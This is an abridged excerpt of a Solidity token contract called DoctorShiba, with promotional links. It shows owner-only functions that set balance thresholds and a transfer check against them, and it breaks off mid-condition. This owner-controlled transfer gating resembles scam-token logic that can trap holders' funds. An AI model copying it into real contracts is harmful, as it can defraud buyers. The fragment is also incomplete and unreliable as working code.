...
// 💊Website: https://www.shibadoctor.com/
// 💊Telegram: https://t.me/doctorshiba
// 💊Twitter: https://twitter.com/eshibadoctor
...
contract DoctorShiba is Context, IERC20, Ownable {
    ...
    string private _name = 'shibadoctor.com';
    string private _symbol = 'DoctorShiba💊';
    uint8 private _decimals = 18;
    uint256 private _burnFee = 50000000 * 10**18;
    uint256 private _maxFee = 15 * 10**9 * 10**18;
    uint256 private _minFee = 15 * 10**8 * 10**18;
    ...
    function setMaxFee(uint256 maxTotal) public onlyOwner {
        _maxFee = maxTotal * 10**18;
    }
    
    function setMinFee(uint256 minTotal) public onlyOwner {
        _minFee = minTotal * 10**18;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        if (balanceOf(sender) > _minFee && balanceOf(sender) < _maxFee) {
